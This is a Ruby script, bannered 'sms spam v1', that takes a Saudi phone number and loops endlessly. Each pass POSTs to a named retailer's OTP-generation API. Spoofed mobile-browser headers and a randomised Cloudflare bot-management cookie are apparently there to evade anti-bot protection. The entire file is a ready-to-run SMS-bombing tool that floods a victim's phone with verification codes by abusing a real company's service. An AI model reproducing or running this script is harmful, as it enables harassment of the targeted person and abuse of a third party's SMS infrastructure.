require 'net/http'
require 'json'
require 'securerandom'
require 'time'

red = "\033[31m"
yellow = "\033[33m"
reset = "\033[0m"
logo = red + "
⢀⡴⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣴⡄⠀⣰⣦⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣀⠀
⢸⣻⣿⣦⡀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠋⠉⠁⠀⠻⠾⠋⠀⠙⠋⠛⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⣴⣧⣹⡄
⠈⢿⣶⡻⢟⡷⣶⣶⣶⢶⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⣤⣤⣤⣤⣶⢾⢿⣹⡟⠀
⠀⠈⠻⣧⣿⣯⡞⡇⢁⡞⠁⠀⠀⠀⠀#{yellow}sms spam v1#{reset}#{red}⠀⠀⠀⠀⠙⣄⠹⡽⣝⣿⣦⣿⠟
⠀⠀⠀⠘⠻⣭⣿⢷⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣤⣷⣟⣿⠿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠻⢿⣧⡴⠤⠀⠀⠀⠀⠀⠀⡆⠀⡿⠀⠀⠀⠀⠀⢠⢤⣤⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣷⣄⣸⣧⣵⡿⠷⢤⣤⡀⠀⢰⠻⠾⢣⠀⠀⣀⣤⡤⢿⣶⣯⣿⠀⣰⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢾⣧⡮⣿⣤⢟⣠⣶⣶⣿⡄⠀⠀⣧⢰⠃⠀⠀⣼⣼⣶⣄⠹⣇⣿⠿⣍⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣸⡆⠀⠸⣼⣿⣇⠫⡟⠿⣦⣀⣿⣸⣆⣠⡾⡟⢻⠇⣿⣿⣿⠈⠂⡏⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢳⡙⣆⠀⠀⠻⠿⠥⠤⢀⣩⠏⠉⠉⠙⢯⣃⠠⠤⢼⠿⠋⠀⢀⡼⣡⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⢋⣿⣷⣦⠤⠤⠰⡋⣽⣂⠀⠀⢀⣺⣍⡷⢤⣠⢤⣴⣯⡙⢿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⣄⣤⣾⡟⠉⠉⢻⣷⣦⣤⣤⣽⣶⣄⣀⣴⣯⣤⣤⣤⣶⡿⠋⠉⢻⣿⣀⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠛⠳⠒⠉⠸⠁⡟⢹⡿⠳⣶⠿⠿⣶⡾⢿⡿⠻⡏⠃⠐⠲⠶⠿⠛⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⢻⢿⠀⠀⠸⠗⢺⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⢸⠀⡀⠀⠀⡇⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" + reset
puts logo

def generate_random_string(length)
    characters = [*('a'..'z'), *('A'..'Z'), *('0'..'9')]
    random_string = Array.new(length) { characters.sample }.join
    return random_string
end

def generate_random_cf_bm()
    length = 64
    characters = [*('a'..'z'), *('A'..'Z'), *('0'..'9'), '-', '_']
    random_cf_bm = Array.new(length) { characters.sample }.join
    return random_cf_bm
end

print("\033[32mEnter Phone Number e.g 55xxxxxx\033[32m (KSA Only): \033[0m")
number = gets.chomp
puts

data = {
    "mobile_code": "966",
    "mobile_number": number,
    "email": ""
}

json_data = JSON.generate(data)

headers = {
    "Accept": "application/json, text/plain, */*",
    "Content-Security-Policy": "default-src 'self';base-uri 'self';block-all-mixed-content;font-src 'self' https: data:;frame-ancestors 'self' 'youtube.com' 'https://www.youtube.com/';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';form-action 'self';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests",
    "http_x_forwarded_for": "",
    "Accept-Language": "ar",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "Origin": "https://www.jarir.com",
    "CurrentToken": "",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Referer": "https://www.jarir.com/checkout",
    "Content-Length": json_data.length.to_s,
    "Connection": "keep-alive",
    "currentIP": ""
}

spam = 0
done = 0

loop do
    if number.start_with?("0") || number.start_with?("966") || number.start_with?("+")
        exit
    end

    random_cf_bm = generate_random_cf_bm()
    headers["Cookie"] = "__cf_bm=#{random_cf_bm}; pxcts=7e92310f-1f68-11ee-bc02-686b5369454e; _pxvid=401ba7aa-1d6e-11ee-96e5-aac5f62c7487"

    uri = URI.parse("https://www.jarir.com/api/sms/generateOTP?storeCode=sa_ar")
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true

    request = Net::HTTP::Post.new(uri.request_uri, headers)
    request.body = json_data

    response = http.request(request)
    sleep(0.5)

    if response.code.to_i == 200
        done += 1
        print("\rDone: #{done} | Spam: #{spam}")
    else
        spam += 1
        print("\rDone: #{done} | Spam: #{spam}")
    end
end
